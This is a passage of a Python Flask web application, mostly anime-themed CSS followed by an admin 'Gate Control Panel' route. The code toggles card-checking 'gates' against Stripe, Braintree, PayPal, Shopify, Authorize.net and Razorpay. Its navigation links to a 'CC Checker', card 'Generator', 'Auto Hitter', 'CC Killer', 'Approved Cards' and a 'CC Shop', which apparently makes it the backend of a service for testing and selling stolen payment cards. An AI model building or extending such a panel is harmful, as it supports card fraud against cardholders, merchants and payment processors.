    .btn-danger { 
        background: linear-gradient(135deg, #ef4444, #f87171);
        color: #fff;
        box-shadow: 0 4px 20px rgba(239,68,68,0.4);
    }
    
    .btn-secondary {
        background: linear-gradient(135deg, #6366f1, #818cf8);
        color: #fff;
        box-shadow: 0 4px 20px rgba(99,102,241,0.4);
    }
    
    .btn:hover { 
        transform: translateY(-3px) scale(1.02);
    }
    
    input, select, textarea {
        padding: 14px 18px;
        border: 2px solid rgba(255,105,180,0.2);
        border-radius: 12px;
        background: rgba(30,15,45,0.8);
        color: #fff;
        margin: 5px 0;
        width: 100%;
        font-family: inherit;
        font-size: 1em;
        transition: all 0.3s ease;
    }
    
    input:focus, select:focus, textarea:focus {
        outline: none;
        border-color: #ff69b4;
        box-shadow: 0 0 20px rgba(255,105,180,0.2);
    }
    
    input::placeholder, textarea::placeholder { 
        color: rgba(255,255,255,0.4);
    }
    
    .form-group {
        margin-bottom: 18px;
    }
    
    .form-group label {
        display: block;
        margin-bottom: 8px;
        color: #ff69b4;
        font-weight: 600;
        font-size: 0.95em;
    }
    
    .alert {
        padding: 18px 22px;
        border-radius: 15px;
        margin-bottom: 20px;
        display: flex;
        align-items: center;
        gap: 12px;
        font-weight: 600;
    }
    
    .alert-success { 
        background: rgba(16,185,129,0.15);
        border: 1px solid #10b981;
        color: #34d399;
    }
    
    .alert-error { 
        background: rgba(239,68,68,0.15);
        border: 1px solid #ef4444;
        color: #f87171;
    }
    
    .alert-info { 
        background: rgba(255,105,180,0.15);
        border: 1px solid #ff69b4;
        color: #ff69b4;
    }
    
    .login-container {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        position: relative;
    }
    
    .login-box {
        background: linear-gradient(145deg, rgba(45,27,61,0.95), rgba(30,15,45,0.98));
        padding: 50px 40px;
        border-radius: 25px;
        text-align: center;
        backdrop-filter: blur(20px);
        width: 100%;
        max-width: 420px;
        border: 1px solid rgba(255,105,180,0.2);
        box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 100px rgba(255,20,147,0.1);
        position: relative;
        z-index: 10;
    }
    
    .login-box::before {
        content: '';
        position: absolute;
        top: -2px;
        left: -2px;
        right: -2px;
        bottom: -2px;
        background: linear-gradient(135deg, #ff1493, #da70d6, #ff69b4, #ba55d3);
        border-radius: 26px;
        z-index: -1;
        opacity: 0.5;
        filter: blur(10px);
    }
    
    .login-box h1 {
        background: linear-gradient(135deg, #ff69b4, #ff1493, #da70d6);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        margin-bottom: 10px;
        font-size: 2em;
        font-weight: 800;
    }
    
    .login-box p {
        opacity: 0.7;
        margin-bottom: 30px;
    }
    
    .login-box input {
        margin: 12px 0;
    }
    
    .login-box .btn {
        width: 100%;
        padding: 15px;
        margin-top: 25px;
        font-size: 1.1em;
    }
    
    .premium-badge {
        background: linear-gradient(135deg, #fbbf24, #f59e0b, #d97706);
        color: #000;
        padding: 6px 18px;
        border-radius: 20px;
        font-weight: 800;
        display: inline-flex;
        align-items: center;
        gap: 6px;
        box-shadow: 0 4px 15px rgba(251,191,36,0.4);
        animation: glow 2s ease-in-out infinite alternate;
    }
    
    @keyframes glow {
        from { box-shadow: 0 4px 15px rgba(251,191,36,0.4); }
        to { box-shadow: 0 4px 25px rgba(251,191,36,0.6); }
    }
    
    .free-badge {
        background: rgba(255,255,255,0.15);
        padding: 6px 18px;
        border-radius: 20px;
        display: inline-block;
        font-weight: 600;
        border: 1px solid rgba(255,255,255,0.2);
    }
    
    .owner-badge {
        background: linear-gradient(135deg, #ff1493, #ff69b4, #da70d6);
        color: #fff;
        padding: 6px 18px;
        border-radius: 20px;
        font-weight: 800;
        display: inline-flex;
        align-items: center;
        gap: 6px;
        box-shadow: 0 4px 20px rgba(255,20,147,0.5);
        animation: ownerGlow 2s ease-in-out infinite alternate;
    }
    
    @keyframes ownerGlow {
        from { box-shadow: 0 4px 20px rgba(255,20,147,0.5); }
        to { box-shadow: 0 4px 35px rgba(255,20,147,0.8); }
    }
    
    .plan-card {
        background: linear-gradient(145deg, rgba(255,105,180,0.08), rgba(138,43,226,0.08));
        padding: 25px;
        border-radius: 18px;
        text-align: center;
        border: 2px solid rgba(255,105,180,0.15);
        transition: all 0.4s ease;
        position: relative;
        overflow: hidden;
    }
    
    .plan-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, transparent 0%, rgba(255,105,180,0.1) 100%);
        opacity: 0;
        transition: opacity 0.3s;
    }
    
    .plan-card:hover::before {
        opacity: 1;
    }
    
    .plan-card:hover {
        border-color: #ff1493;
        transform: translateY(-8px) scale(1.02);
        box-shadow: 0 15px 40px rgba(255,20,147,0.3);
    }
    
    .plan-card h3 {
        background: linear-gradient(135deg, #ff69b4, #da70d6);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        margin-bottom: 10px;
        font-size: 1.3em;
        font-weight: 700;
    }
    
    .plan-card .price {
        font-size: 2.5em;
        font-weight: 800;
        margin: 15px 0;
        background: linear-gradient(135deg, #fff, #ff69b4);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }
    
    .result-box {
        background: linear-gradient(145deg, rgba(30,15,45,0.9), rgba(20,10,30,0.95));
        padding: 20px;
        border-radius: 15px;
        margin-top: 20px;
        border: 1px solid rgba(255,105,180,0.2);
        font-family: 'Consolas', 'Monaco', monospace;
        white-space: pre-wrap;
        word-break: break-all;
        max-height: 400px;
        overflow-y: auto;
    }
    
    .result-approved {
        color: #34d399;
        border-color: #10b981;
        background: linear-gradient(145deg, rgba(16,185,129,0.1), rgba(30,15,45,0.9));
    }
    
    .result-declined {
        color: #f87171;
        border-color: #ef4444;
        background: linear-gradient(145deg, rgba(239,68,68,0.1), rgba(30,15,45,0.9));
    }
    
    .gate-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
        gap: 12px;
        margin-bottom: 20px;
    }
    
    .gate-btn {
        padding: 12px;
        border: 2px solid rgba(255,105,180,0.2);
        border-radius: 12px;
        background: rgba(30,15,45,0.6);
        color: #fff;
        cursor: pointer;
        transition: all 0.3s;
        font-weight: 600;
        text-align: center;
    }
    
    .gate-btn:hover, .gate-btn.selected {
        border-color: #ff1493;
        background: rgba(255,20,147,0.2);
        color: #ff69b4;
    }
    
    .gate-btn.selected {
        box-shadow: 0 0 20px rgba(255,20,147,0.3);
    }
    
    .loading {
        display: inline-block;
        width: 20px;
        height: 20px;
        border: 3px solid rgba(255,105,180,0.3);
        border-radius: 50%;
        border-top-color: #ff1493;
        animation: spin 1s ease-in-out infinite;
    }
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    
    .anime-decor {
        position: fixed;
        bottom: 20px;
        right: 20px;
        width: 150px;
        height: 150px;
        opacity: 0.3;
        z-index: 5;
        pointer-events: none;
    }
    
    .anime-girl {
        position: fixed;
        bottom: 0;
        right: 20px;
        width: 200px;
        height: auto;
        z-index: 50;
        pointer-events: none;
        animation: float 3s ease-in-out infinite;
        filter: drop-shadow(0 0 20px rgba(255,105,180,0.5));
    }
    
    .anime-girl-left {
        position: fixed;
        bottom: 0;
        left: 270px;
        width: 180px;
        height: auto;
        z-index: 50;
        pointer-events: none;
        animation: float 4s ease-in-out infinite;
        filter: drop-shadow(0 0 20px rgba(138,43,226,0.5));
    }
    
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
    }
    
    .floating-hearts {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 2;
        overflow: hidden;
    }
    
    .heart {
        position: absolute;
        font-size: 20px;
        animation: floatUp 8s linear infinite;
        opacity: 0.6;
    }
    
    .heart:nth-child(1) { left: 10%; animation-delay: 0s; animation-duration: 10s; }
    .heart:nth-child(2) { left: 20%; animation-delay: 2s; animation-duration: 8s; }
    .heart:nth-child(3) { left: 35%; animation-delay: 4s; animation-duration: 12s; }
    .heart:nth-child(4) { left: 50%; animation-delay: 1s; animation-duration: 9s; }
    .heart:nth-child(5) { left: 65%; animation-delay: 3s; animation-duration: 11s; }
    .heart:nth-child(6) { left: 80%; animation-delay: 5s; animation-duration: 7s; }
    .heart:nth-child(7) { left: 90%; animation-delay: 2.5s; animation-duration: 10s; }
    
    @keyframes floatUp {
        0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
        10% { opacity: 0.6; }
        90% { opacity: 0.6; }
        100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
    }
    
    .stars {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1;
    }
    
    .star {
        position: absolute;
        font-size: 12px;
        animation: twinkle 2s ease-in-out infinite;
    }
    
    .star:nth-child(1) { top: 10%; left: 15%; animation-delay: 0s; }
    .star:nth-child(2) { top: 20%; left: 45%; animation-delay: 0.5s; }
    .star:nth-child(3) { top: 15%; left: 75%; animation-delay: 1s; }
    .star:nth-child(4) { top: 40%; left: 85%; animation-delay: 1.5s; }
    .star:nth-child(5) { top: 60%; left: 70%; animation-delay: 0.3s; }
    .star:nth-child(6) { top: 80%; left: 55%; animation-delay: 0.8s; }
    .star:nth-child(7) { top: 70%; left: 35%; animation-delay: 1.2s; }
    .star:nth-child(8) { top: 30%; left: 60%; animation-delay: 0.7s; }
    
    @keyframes twinkle {
        0%, 100% { opacity: 0.3; transform: scale(1); }
        50% { opacity: 1; transform: scale(1.3); }
    }
    
    .neko-ears {
        position: fixed;
        top: 10px;
        right: 100px;
        font-size: 40px;
        animation: wiggle 2s ease-in-out infinite;
        z-index: 60;
        pointer-events: none;
    }
    
    @keyframes wiggle {
        0%, 100% { transform: rotate(-5deg); }
        50% { transform: rotate(5deg); }
    }
    
    .kawaii-badge {
        display: inline-flex;
        align-items: center;
        gap: 5px;
        background: linear-gradient(135deg, #ff69b4, #ff1493);
        padding: 4px 12px;
        border-radius: 15px;
        font-size: 0.8em;
        font-weight: 700;
        animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.05); }
    }
    
    .bounce-in {
        animation: bounceIn 0.6s ease-out;
    }
    
    @keyframes bounceIn {
        0% { transform: scale(0.3); opacity: 0; }
        50% { transform: scale(1.05); }
        70% { transform: scale(0.9); }
        100% { transform: scale(1); opacity: 1; }
    }
    
    .slide-in {
        animation: slideIn 0.5s ease-out;
    }
    
    @keyframes slideIn {
        from { transform: translateX(-30px); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    /* Mobile-first Telegram Mini App styles */
    @media (max-width: 768px) {
        body {
            font-size: 14px;
        }
        
        .sidebar {
            position: fixed;
            left: -280px;
            top: 0;
            width: 260px;
            height: 100vh;
            transition: left 0.3s ease;
            z-index: 1000;
        }
        
        .sidebar.open {
            left: 0;
        }
        
        .sidebar-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
        
        .sidebar-overlay.show {
            display: block;
        }
        
        .main {
            margin-left: 0;
            padding: 15px;
            padding-top: 60px;
        }
        
        .mobile-header {
            display: flex;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: calc(55px + env(safe-area-inset-top));
            padding-top: env(safe-area-inset-top);
            background: linear-gradient(135deg, rgba(30,15,45,0.98), rgba(20,10,35,0.98));
            backdrop-filter: blur(15px);
            align-items: center;
            padding-left: max(15px, env(safe-area-inset-left));
            padding-right: max(15px, env(safe-area-inset-right));
            z-index: 998;
            border-bottom: 1px solid rgba(255,105,180,0.2);
        }
        
        .main {
            padding-top: calc(60px + env(safe-area-inset-top));
            padding-left: max(15px, env(safe-area-inset-left));
            padding-right: max(15px, env(safe-area-inset-right));
        }
        
        .mobile-menu-btn {
            width: 44px;
            height: 44px;
            min-width: 44px;
            min-height: 44px;
            border: none;
            background: rgba(255,105,180,0.2);
            border-radius: 10px;
            color: #ff69b4;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .mobile-title {
            flex: 1;
            text-align: center;
            font-size: 1.1em;
            font-weight: 700;
            background: linear-gradient(135deg, #ff69b4, #da70d6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .card {
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 15px;
        }
        
        .card h2 {
            font-size: 1.2em;
            margin-bottom: 15px;
        }
        
        .stats-grid {
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        
        .stat-card {
            padding: 15px;
        }
        
        .stat-card h3 {
            font-size: 1.5em;
        }
        
        .gate-grid {
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
        }
        
        .gate-btn {
            padding: 10px 8px;
            font-size: 0.85em;
        }
        
        input, textarea, select {
            font-size: 16px !important; /* Prevent iOS zoom */
            padding: 12px;
        }
        
        .btn {
            padding: 12px 20px;
            font-size: 1em;
            width: 100%;
            margin: 5px 0;
        }
        
        .plan-grid {
            grid-template-columns: 1fr;
        }
        
        .plan-card {
            padding: 20px;
        }
        
        .plan-card .price {
            font-size: 2em;
        }
        
        .anime-girl, .anime-girl-left, .neko-ears {
            display: none !important;
        }
        
        .floating-hearts .heart {
            font-size: 16px;
        }
        
        .stars .star {
            font-size: 10px;
        }
        
        .header h1 {
            font-size: 1.4em;
        }
        
        table {
            font-size: 0.85em;
        }
        
        th, td {
            padding: 8px 6px;
        }
        
        .result-box {
            padding: 12px;
            font-size: 0.9em;
            max-height: 250px;
        }
        
        .login-box {
            padding: 25px 20px;
            margin: 15px;
            width: calc(100% - 30px);
            max-width: none;
        }
        
        .login-box h1 {
            font-size: 1.5em;
        }
    }
    
    /* Extra small screens */
    @media (max-width: 380px) {
        .stats-grid {
            grid-template-columns: 1fr;
        }
        
        .gate-grid {
            grid-template-columns: 1fr;
        }
    }
    
    /* Desktop styles */
    @media (min-width: 769px) {
        .mobile-header {
            display: none;
        }
        
        .sidebar-overlay {
            display: none !important;
        }
        .bottom-nav { display: none !important; }
    }

    /* === Mobile-first redesign additions === */
    /* Bottom tab bar — always visible on phones */
    .bottom-nav {
        display: none;
    }
    @media (max-width: 768px) {
        .bottom-nav {
            display: flex;
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            height: calc(62px + env(safe-area-inset-bottom));
            padding-bottom: env(safe-area-inset-bottom);
            background: linear-gradient(180deg, rgba(30,15,45,0.92), rgba(20,10,35,0.98));
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border-top: 1px solid rgba(255,105,180,0.25);
            z-index: 997;
            justify-content: space-around;
            align-items: stretch;
            box-shadow: 0 -8px 30px rgba(255,20,147,0.15);
        }
        .bottom-nav a, .bottom-nav button {
            flex: 1 1 0;
            min-width: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 3px;
            color: #d8b8ee;
            text-decoration: none;
            font-size: 0.68em;
            font-weight: 700;
            background: transparent;
            border: none;
            min-height: 44px;
            cursor: pointer;
            padding: 6px 2px;
            position: relative;
            transition: color 0.2s ease;
            text-align: center;
        }
        .bottom-nav a > span:not(.ico),
        .bottom-nav button > span:not(.ico) {
            display: block;
            max-width: 100%;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .bottom-nav a .ico, .bottom-nav button .ico {
            font-size: 1.35em;
            line-height: 1;
        }
        .bottom-nav a.active, .bottom-nav button.active {
            color: #ff69b4;
        }
        .bottom-nav a.active::before, .bottom-nav button.active::before {
            content: '';
            position: absolute;
            top: 0; left: 25%; right: 25%;
            height: 3px;
            border-radius: 0 0 4px 4px;
            background: linear-gradient(90deg, #ff1493, #da70d6);
            box-shadow: 0 0 12px rgba(255,20,147,0.6);
        }
        /* Reserve room above bottom nav so content + buttons aren't covered */
        .main {
            padding-bottom: calc(82px + env(safe-area-inset-bottom)) !important;
        }
        /* Fix stat cards getting clipped on small screens */
        .stat-card {
            padding: 14px 10px !important;
            min-width: 0;
            overflow: hidden;
        }
        .stat-card h3 {
            font-size: 1.35em !important;
            line-height: 1.15;
            overflow-wrap: anywhere;
            word-break: break-word;
        }
        .stat-card p {
            font-size: 0.78em;
            opacity: 0.85;
            overflow-wrap: anywhere;
        }
        /* Larger, easier-to-tap form controls */
        .btn {
            min-height: 46px;
            border-radius: 14px !important;
        }
        /* Sidebar drawer width tweak for one-thumb reach */
        .sidebar {
            width: min(86vw, 300px) !important;
            left: calc(-1 * min(86vw, 300px));
            padding-bottom: calc(80px + env(safe-area-inset-bottom)) !important;
        }
        .sidebar.open { left: 0 !important; }
        .sidebar a {
            padding: 14px 14px;
            min-height: 48px;
        }
        /* Top hamburger header opens the full sidebar drawer (bottom nav covers the 5 primary tabs) */
        .mobile-header { display: flex; }
        /* Make tables/cards breathe */
        .header { margin-bottom: 18px; padding-bottom: 14px; }
        .header h1 { font-size: 1.3em !important; }
    }
    @media (max-width: 380px) {
        .bottom-nav a, .bottom-nav button { font-size: 0.62em; }
        .bottom-nav a .ico, .bottom-nav button .ico { font-size: 1.2em; }
        .stat-card h3 { font-size: 1.15em !important; }
    }

    /* Sidebar close button (visible inside drawer) */
    .sidebar-close {
        position: absolute;
        top: 10px;
        right: 12px;
        width: 44px;
        height: 44px;
        min-width: 44px;
        min-height: 44px;
        border-radius: 50%;
        border: 1px solid rgba(255,105,180,0.3);
        background: rgba(255,105,180,0.12);
        color: #ff69b4;
        font-size: 22px;
        line-height: 1;
        cursor: pointer;
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 5;
    }
    @media (max-width: 768px) {
        .sidebar-close { display: flex; }
    }

    /* Collapsible nav sections + slimmer desktop sidebar */
    .nav-section-title {
        cursor: pointer;
        user-select: none;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }
    .nav-section-title .caret {
        font-size: 0.9em;
        opacity: 0.6;
        transition: transform 0.2s ease;
    }
    .nav-section.collapsed .caret { transform: rotate(-90deg); }
    .nav-section-body {
        max-height: 800px;
        overflow: hidden;
        transition: max-height 0.25s ease;
    }
    .nav-section.collapsed .nav-section-body {
        max-height: 0;
    }
    @media (min-width: 769px) {
        .sidebar { width: 220px !important; padding: 16px 12px !important; }
        .main { margin-left: 220px !important; }
        .sidebar a { padding: 9px 12px; margin: 2px 0; font-size: 0.92em; }
        .sidebar a.active {
            background: linear-gradient(90deg, rgba(255,20,147,0.22), rgba(255,105,180,0.05));
            box-shadow: 0 0 18px rgba(255,20,147,0.25), inset 0 0 12px rgba(255,105,180,0.15);
        }
        .nav-section-title { padding: 8px 12px 4px; }
    }

    /* Mobile card-list version of pending payments table */
    @media (max-width: 768px) {
        .pay-cards { display: flex; flex-direction: column; gap: 10px; }
        .pay-card {
            background: linear-gradient(145deg, rgba(255,105,180,0.08), rgba(138,43,226,0.08));
            border: 1px solid rgba(255,105,180,0.2);
            border-radius: 14px;
            padding: 14px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .pay-card .row {
            display: flex;
            justify-content: space-between;
            font-size: 0.85em;
        }
        .pay-card .row .lbl { opacity: 0.6; }
        .pay-card .status { font-weight: 700; }
        .pay-table-desktop { display: none; }
    }
    @media (min-width: 769px) {
        .pay-cards { display: none; }
    }

    /* Dashboard quick-action chips */
    .quick-actions {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        margin-bottom: 20px;
    }
    .qa-chip {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        text-decoration: none;
        color: #fff;
        font-weight: 700;
        font-size: 0.95em;
        padding: 14px 12px;
        min-height: 52px;
        border-radius: 14px;
        background: linear-gradient(135deg, rgba(255,20,147,0.18), rgba(138,43,226,0.18));
        border: 1px solid rgba(255,105,180,0.3);
        box-shadow: 0 4px 16px rgba(255,20,147,0.12);
        transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
    }
    .qa-chip:hover {
        transform: translateY(-2px);
        border-color: rgba(255,105,180,0.6);
        box-shadow: 0 8px 24px rgba(255,20,147,0.25);
    }
    .qa-chip .qa-ico { font-size: 1.25em; }
    @media (max-width: 768px) {
        .quick-actions {
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
        }
        .qa-chip {
            flex-direction: column;
            gap: 4px;
            padding: 10px 6px;
            font-size: 0.78em;
            min-height: 64px;
            text-align: center;
        }
        .qa-chip .qa-ico { font-size: 1.5em; }
    }
</style>
"""

ANIME_DECORATIONS = '''
<div class="floating-hearts">
    <div class="heart">💖</div>
    <div class="heart">💕</div>
    <div class="heart">💗</div>
    <div class="heart">💝</div>
    <div class="heart">💖</div>
    <div class="heart">💕</div>
    <div class="heart">💗</div>
</div>
<div class="stars">
    <div class="star">✨</div>
    <div class="star">⭐</div>
    <div class="star">✨</div>
    <div class="star">💫</div>
    <div class="star">✨</div>
    <div class="star">⭐</div>
</div>
'''

GATE_LIST = [
    ("exgate", "ExGate / External Gate Checker"),
    ("sq", "Square Auth $0"),
    ("bu", "Braintree Auth $1"),
    ("pp", "PayPal $1"),
    ("ppv", "PayPal V2 (Admin Only)"),
    ("sor", "Stripe $2"),
    ("st5", "Stripe $5"),
    ("st12", "Stripe $12"),
    ("str", "Stripe $15 Donation"),
    ("b3n", "Braintree $5"),
    ("dep", "Stripe $49"),
    ("wah", "Website Auto-Hit (WAH)"),
    ("auz", "Authorize.net $0"),
    ("asd", "Authorize.net $7"),
    ("atf", "Authorize.net $25"),
    ("anh", "Authorize.net $200"),
    ("sh6", "Shopify $6"),
    ("sh8", "Shopify $8"),
    ("sh10", "Shopify $10"),
    ("sh13", "Shopify $13"),
    ("b3", "Braintree Auth"),
    ("mb3", "Mass Braintree"),
    ("ast", "Auto Stripe Auth"),
    ("st", "Stripe Auth"),
    ("rz", "Razorpay ₹1"),
    ("rzp", "Razorpay Pages"),
    ("mrz", "Mass Razorpay ₹1"),
    ("mrzp", "Mass Razorpay Pages"),
    ("payu", "PayU ₹1"),
    ("mpayu", "Mass PayU ₹1"),
    ("kill", "CC Killer"),
    ("stm", "Stripe Mass Auth"),
    ("se1", "SE1 Gate"),
    ("sh", "Shopify (Netherex)"),
    ("st1", "Stripe $1"),
    ("bt1", "Braintree $1"),
    ("bt3d", "Braintree 3D"),
]

@app.route('/admin/gates')
@admin_required
def admin_gates():
    from modules.gate_status import get_all_gate_status
    statuses = get_all_gate_status()

    rows = ""
    for gate_id, gate_label in GATE_LIST:
        is_offline = statuses.get(gate_id, False)
        checked = "checked" if is_offline else ""
        status_text = "OFFLINE" if is_offline else "ONLINE"
        status_color = "#e94560" if is_offline else "#4ade80"
        rows += f"""
        <div class="gate-row" id="row-{gate_id}">
            <div class="gate-info">
                <span class="gate-cmd">/{gate_id}</span>
                <span class="gate-label">{gate_label}</span>
            </div>
            <div class="gate-controls">
                <span class="gate-status" id="status-{gate_id}" style="color:{status_color};font-weight:bold;min-width:70px;display:inline-block;">{status_text}</span>
                <label class="toggle-switch" title="Toggle {gate_id} offline">
                    <input type="checkbox" {checked} onchange="toggleGate('{gate_id}', this.checked)">
                    <span class="toggle-slider"></span>
                </label>
            </div>
        </div>"""

    return render_template_string(f"""
    <html>
    <head><title>Gates - Onichan Admin</title>{ADMIN_CSS}
    <style>
        .gate-row {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 20px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            margin-bottom: 10px;
            border: 1px solid rgba(255,255,255,0.08);
            transition: background 0.2s;
        }}
        .gate-row:hover {{ background: rgba(255,255,255,0.09); }}
        .gate-info {{ display: flex; flex-direction: column; gap: 4px; }}
        .gate-cmd {{ font-family: monospace; font-size: 1.05em; color: #a78bfa; font-weight: bold; }}
        .gate-label {{ font-size: 0.88em; color: rgba(255,255,255,0.6); }}
        .gate-controls {{ display: flex; align-items: center; gap: 16px; }}
        .toggle-switch {{ position: relative; width: 64px; height: 32px; display: inline-block; flex-shrink: 0; }}
        .toggle-switch input {{ opacity: 0; width: 0; height: 0; }}
        .toggle-slider {{
            position: absolute; cursor: pointer;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: #4ade80;
            transition: 0.3s; border-radius: 32px;
        }}
        .toggle-slider:before {{
            position: absolute; content: "";
            height: 24px; width: 24px;
            left: 4px; bottom: 4px;
            background-color: white;
            transition: 0.3s; border-radius: 50%;
        }}
        input:checked + .toggle-slider {{ background-color: #e94560; }}
        input:checked + .toggle-slider:before {{ transform: translateX(32px); }}
        .toast {{
            position: fixed; bottom: 24px; right: 24px;
            background: #1a1a2e; color: #fff;
            padding: 12px 22px; border-radius: 8px;
            border-left: 4px solid #4ade80;
            opacity: 0; transition: opacity 0.3s;
            z-index: 9999; font-size: 0.95em;
        }}
        .toast.error {{ border-left-color: #e94560; }}
        .toast.show {{ opacity: 1; }}
        .bulk-controls {{ display:flex; gap:10px; margin-bottom:18px; flex-wrap:wrap; }}
        .bulk-btn {{ padding: 8px 18px; border-radius:7px; border:none; cursor:pointer; font-size:0.92em; font-weight:600; }}
        .bulk-btn.disable-all {{ background:#e94560; color:#fff; }}
        .bulk-btn.enable-all {{ background:#4ade80; color:#1a1a2e; }}
    </style>
    </head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()">
            <span></span><span></span><span></span>
        </button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/gates" class="active" onclick="closeSidebar()">Gates</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/proxyshop" onclick="closeSidebar()">Proxy Shop</a>
            <a href="/admin/casino" onclick="closeSidebar()">Casino</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header"><h1>⚡ Gate Control Panel</h1></div>
            <div class="card">
                <h2 style="margin-bottom:6px;">Gate Maintenance Toggles</h2>
                <p style="color:rgba(255,255,255,0.55);margin-bottom:18px;font-size:0.92em;">
                    Toggle any gate <b>ON</b> (green = online) or <b>OFF</b> (red = offline/maintenance).<br>
                    When offline, users see a maintenance message instead of the checker.
                </p>
                <div class="bulk-controls">
                    <button class="bulk-btn disable-all" onclick="bulkToggle(true)">🚫 Disable All</button>
                    <button class="bulk-btn enable-all" onclick="bulkToggle(false)">✅ Enable All</button>
                </div>
                {rows}
            </div>
        </div>
        <div class="toast" id="toast"></div>
        <script>
        function showToast(msg, isError) {{
            var t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast' + (isError ? ' error' : '') + ' show';
            setTimeout(function(){{ t.className = 'toast'; }}, 2500);
        }}
        function toggleGate(gate, offline) {{
            fetch('/admin/gates/toggle', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{gate: gate, offline: offline}})
            }})
            .then(function(r){{ return r.json(); }})
            .then(function(d){{
                if (d.ok) {{
                    var el = document.getElementById('status-' + gate);
                    if (el) {{
                        el.textContent = offline ? 'OFFLINE' : 'ONLINE';
                        el.style.color = offline ? '#e94560' : '#4ade80';
                    }}
                    showToast('/' + gate + ' is now ' + (offline ? 'OFFLINE' : 'ONLINE'), offline);
                }} else {{
                    showToast('Error: ' + (d.error || 'unknown'), true);
                }}
            }})
            .catch(function(e){{ showToast('Request failed', true); }});
        }}
        function bulkToggle(offline) {{
            var checkboxes = document.querySelectorAll('.toggle-switch input[type=checkbox]');
            checkboxes.forEach(function(cb) {{
                var gate = cb.getAttribute('onchange').match(/'([^']+)'/)[1];
                if (cb.checked !== offline) {{
                    cb.checked = offline;
                    toggleGate(gate, offline);
                }}
            }});
        }}
        </script>
    </body>
    </html>
    """)

@app.route('/admin/gates/toggle', methods=['POST'])
@admin_required
def admin_gates_toggle():
    from modules.gate_status import set_gate_offline
    data = request.get_json(silent=True) or {}
    gate = data.get('gate', '').strip()
    offline = bool(data.get('offline', False))
    valid_gates = {g for g, _ in GATE_LIST}
    if not gate or gate not in valid_gates:
        return jsonify({'ok': False, 'error': 'Invalid gate'}), 400
    set_gate_offline(gate, offline)
    return jsonify({'ok': True, 'gate': gate, 'offline': offline})

def user_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('user_id'):
            return redirect('/user/login')
        return f(*args, **kwargs)
    return decorated_function

def get_user_sidebar(active_page, page_title="Onichan"):
    """Generate anime-themed sidebar HTML with mobile support"""
    
    def link(key, name, url):
        active = 'class="active"' if key == active_page else ''
        return f'<a href="{url}" {active} onclick="closeMobileMenu()">{name}</a>'

    # Bottom-nav tab grouping — which active_page lights up which tab
